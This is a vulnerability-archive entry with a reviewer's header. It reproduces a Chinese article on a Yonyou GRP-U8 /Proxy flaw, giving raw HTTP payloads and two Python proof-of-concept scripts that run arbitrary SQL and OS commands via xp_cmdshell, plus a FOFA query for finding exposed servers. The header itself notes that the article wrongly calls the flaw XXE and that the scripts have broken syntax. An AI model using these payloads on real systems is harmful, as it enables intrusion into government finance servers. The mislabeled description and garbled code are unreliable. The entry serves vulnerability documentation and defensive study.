---
source: "MrWQ/vulnerability-paper"
title: "用友GRP-U8 Proxy任意SQL执行/xp_cmdshell链"
product: "用友GRP-U8"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未列"
prerequisites: "Cookie示例；DB高权限及xp_cmdshell"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/xFGBEigTXQxMo0em4gzV0Q"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BGRP-u8/%E7%94%A8%E5%8F%8B%20GRP-U8SQL%20%E6%B3%A8%E5%85%A5%20and%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.md"
id: "vw-b1f12c01979a97480a84834e"
entity_id: "ve-b1f12c01979a97480a84834e"
schema_version: "1"
---

# 用友GRP-U8 Proxy任意SQL执行/xp_cmdshell链

## 条目说明

- 对象与具体问题：用友GRP-U8；Proxy任意SQL执行/xp_cmdshell链
- 版本、配置及部署条件：未列
- 认证与权限前提：Cookie示例；DB高权限及xp_cmdshell
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 同127错误XXE叙述，无外部实体证据
- HTTP POST/Proxy无空格、XML标签属性丢空格、Python iflen/if__name__语法损坏
- 缺根因/修复build及配置前提；直接ROW[0]可异常

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/xFGBEigTXQxMo0em4gzV0Q)

#### **一、漏洞介绍**

 用友 GRP-U8 行政事业财务管理软件是用友公司专注于国家电子政务事业，基于云计算技术所推出的新一代产品，是我国行政事业财务领域最专业的政府财务管理软件。用友 GRP-u8 被曝存在 XXE 漏洞，该漏洞源于应用程序解析 XML 输入时没有限制外部实体的加载，导致可加载恶意外部文件，可以执行 SQL 语句，甚至可以执行系统命令。

#### **二、影响版本**

**GRP-U8**

#### **三、漏洞复现**

##### 1. 环境搭建

fofa 语法

title="GRP-U8"

##### 2. 漏洞复现

(1): 执行 SQL 语句 payload

POST/Proxy HTTP/1.1  
Host: xxx.xxx.xxx.xxx  
Upgrade-Insecure-Requests: 1  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102Safari/537.36  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
Accept-Encoding: gzip, deflate  
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8  
Cookie: JSESSIONID=25EDA97813692F4D1FAFBB74FD7CFFE0  
Connection: close  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 386  
   
cVer=9.8.0&dp=<?xml version="1.0"encoding="GB2312"?><R9PACKETversion="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATAformat="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATAformat="text">select@@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaV90ZgbJcCFIkrHEkfy7rbgr0vic8FYm8C9QZdqicv9JyG0kPwQXNZZ4TgXr9GQ8icUmuNJ6YH4Zl9g/640?wx_fmt=png)

(2): 执行 SQL 语句脚本

```
import re 
import requests 
import sys 
 
iflen(sys.argv) !=2: 
    print("Usage: python poc.py url") 
    print("example: python poc.py http://127.0.0.1:8080") 
    sys.exit(1) 
url = sys.argv[1] 
headers = { 
    "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36", 
    "Content-Type":"application/x-www-form-urlencoded", 
} 
def poc(url): 
    url = url +'/Proxy'
    print(url) 
    data ='cVer=9.8.0&dp=<?xmlversion="1.0" encoding="GB2312"?><R9PACKETversion="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATAformat="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATAformat="text">select@@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'
    res = requests.post(url,headers=headers,data=data) 
    res = res.text 
    result_row =r'<ROW COLUMN1="(.*?)"'
    ROW = re.findall(result_row,res,re.S| re.M) 
    print(ROW[0]) 
if__name__=="__main__": 
    poc(sys.argv[1])
```

(3): 使用方法

python3GRP-U8.py url

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaV90ZgbJcCFIkrHEkfy7rb3Zr0xnoclTbxhGQBEJv3WfFgoKiaIibic63n0vLdssqq7A8KyAEoAiahJg/640?wx_fmt=png)

(4): 执行命令 payload

POST/Proxy HTTP/1.1  
Host: xxx.xxx.xxx.xxx  
Upgrade-Insecure-Requests: 1  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102Safari/537.36  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
Accept-Encoding: gzip, deflate  
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8  
Cookie: JSESSIONID=25EDA97813692F4D1FAFBB74FD7CFFE0  
Connection: close  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 357  
   
cVer=9.8.0&dp=<?xml version="1.0"encoding="GB2312"?><R9PACKETversion="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATAformat="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATAformat="text">exec xp_cmdshell'whoami'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaV90ZgbJcCFIkrHEkfy7rbONyrHibCbaWKhZTSGp4t5Bkg9libyIAATqxjd3zMb8R2sf9bHUspjkdA/640?wx_fmt=png)

(5): 执行命令脚本

```
import re 
import requests 
import sys 
 
iflen(sys.argv) !=2: 
    print("Usage: python poc.py url") 
    print("example: python poc.py http://127.0.0.1:8080") 
    sys.exit(1) 
url = sys.argv[1] 
headers = { 
    "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36", 
    "Content-Type":"application/x-www-form-urlencoded", 
} 
def poc(url): 
    url = url +'/Proxy'
    print(url) 
    data ='cVer=9.8.0&dp=<?xmlversion="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATAformat="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATAformat="text">exec xp_cmdshell"whoami"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'
    res = requests.post(url,headers=headers,data=data) 
    res = res.text 
    result_row =r'<ROW output="(.*?)"'
    ROW = re.findall(result_row,res,re.S| re.M) 
    print(ROW[0]) 
if__name__=="__main__": 
    poc(sys.argv[1])
```

(6): 使用方法

python3GRP-U8.py url

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaV90ZgbJcCFIkrHEkfy7rbuWunwTBgpWC5jsAcBAEFLtZQCRgqJhiar7nX4yVsIFz5tnLNrHzkAiag/640?wx_fmt=png)

#### 四、修复建议

1. 升级到安全版本

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
